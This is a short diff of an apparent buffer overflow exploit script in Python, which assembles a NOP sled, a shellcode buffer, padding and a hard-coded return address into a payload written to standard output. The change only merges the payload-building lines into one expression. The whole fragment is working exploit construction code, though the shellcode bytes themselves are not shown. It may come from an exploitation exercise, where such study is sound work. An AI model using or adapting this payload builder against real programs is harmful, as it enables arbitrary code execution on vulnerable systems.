@@ -21,10 +21,4 @@ padding = b"A" * padding_length
 
 address = pack("<Q", 0x7fffffffe87c)
 
-payload = b""
-payload += nopsled
-payload += buf
-payload += padding
-payload += address
-
-sys.stdout.buffer.write(payload)
+sys.stdout.buffer.write(nopsled + buf + padding + address)
